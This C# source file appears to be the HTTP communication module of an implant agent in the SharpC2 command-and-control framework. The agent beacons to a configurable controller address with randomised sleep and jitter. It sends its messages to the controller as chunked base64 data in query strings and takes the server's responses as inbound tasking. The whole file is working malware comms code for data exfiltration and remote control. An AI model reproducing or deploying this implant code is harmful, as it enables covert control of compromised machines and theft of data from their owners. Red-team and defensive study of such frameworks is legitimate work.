using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;

using Shared.Models;

using System;
using System.Collections.Generic;
using System.Net;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Comms
{
    class HTTPCommModule : ICommModule
    {
        ModuleStatus Status;

        readonly string AgentID;
        readonly string ConnectAddress;
        readonly int ConnectPort;

        const int MaxChunkSize = 2000;

        ConfigController Config;

        Queue<AgentMessage> Inbound = new Queue<AgentMessage>();
        Queue<AgentMessage> Outbound = new Queue<AgentMessage>();
        Queue<HTTPChunk> OutChunks = new Queue<HTTPChunk>();

        public HTTPCommModule(string AgentID, string ConnectAddress, int ConnectPort)
        {
            Status = ModuleStatus.Starting;

            this.AgentID = AgentID;
            this.ConnectAddress = ConnectAddress;
            this.ConnectPort = ConnectPort;
        }

        public void Init(ConfigController Config)
        {
            this.Config = Config;
        }

        public void SendData(AgentMessage Message)
        {
            Outbound.Enqueue(Message);
        }

        public bool RecvData(out AgentMessage Message)
        {
            if (Inbound.Count > 0)
            {
                Message = Inbound.Dequeue();
                return true;
            }
            else
            {
                Message = null;
                return false;
            }
        }

        public void Start()
        {
            Status = ModuleStatus.Running;

            Task.Factory.StartNew(delegate ()
            {
                while (Status == ModuleStatus.Running)
                {
                    Checkin();

                    var interval = Config.Get<int>(AgentConfig.SleepInterval);
                    var jitter = Config.Get<int>(AgentConfig.SleepJitter);
                    var sleep = CalculateSleep(interval, jitter);

                    Thread.Sleep(sleep);
                }
            });
        }

        void Checkin()
        {
            AgentMessage message;

            if (Outbound.Count > 0)
            {
                message = Outbound.Dequeue();
            }
            else
            {
                message = new AgentMessage
                {
                    AgentID = AgentID
                };
            }

            var data = Convert.ToBase64String(Shared.Utilities.Utilities.SerialiseData(message));
            var chunkID = Shared.Utilities.Utilities.GetRandomString(6);

            for (var i = 0; i <= data.Length; i += MaxChunkSize)
            {
                var chunk = new HTTPChunk
                {
                    AgentID = AgentID,
                    ChunkID = chunkID
                };

                if (i + MaxChunkSize >= data.Length)
                {
                    chunk.Data = data.Substring(i, data.Length - i);
                    chunk.Final = true;
                }
                else
                {
                    chunk.Data = data.Substring(i, MaxChunkSize);
                    chunk.Final = false;
                }

                OutChunks.Enqueue(chunk);
            }

            if (OutChunks.Count > 0)
            {
                var nextChunk = OutChunks.Dequeue();

                var x = string.Format("/?agentid={0}&chunkid={1}&data={2}&final={3}",
                    nextChunk.AgentID, nextChunk.ChunkID, nextChunk.Data, nextChunk.Final,
                    UriKind.Relative);

                var uri = new Uri(x, UriKind.Relative);

                var client = NewClient();
                client.DownloadDataAsync(uri);
            }
        }

        WebClient NewClient()
        {
            var client = new WebClient();

            client.BaseAddress = $"http://{ConnectAddress}:{ConnectPort}";
            client.Headers.Clear();
            client.Headers.Add("X-Malware", "SharpC2");

            client.DownloadDataCompleted += WebClient_DownloadDataCompleted;

            return client;
        }

        void WebClient_DownloadDataCompleted(object sender, DownloadDataCompletedEventArgs e)
        {
            try
            {
                if (e.Result.Length > 0)
                {
                    var message = Shared.Utilities.Utilities.DeserialiseData<AgentMessage>(e.Result);

                    if (message != null)
                    {
                        Inbound.Enqueue(message);
                    }
                }
            }
            catch
            {

            }
        }

        int CalculateSleep(int Interval, int Jitter)
        {
            var diff = (Interval / 100) * Jitter;
            var upper = Interval + diff;
            var lower = Interval - diff;

            var rand = new Random();
            return rand.Next(lower, upper) * 1000;
        }

        public void Stop()
        {
            Status = ModuleStatus.Stopped;
        }
    }
}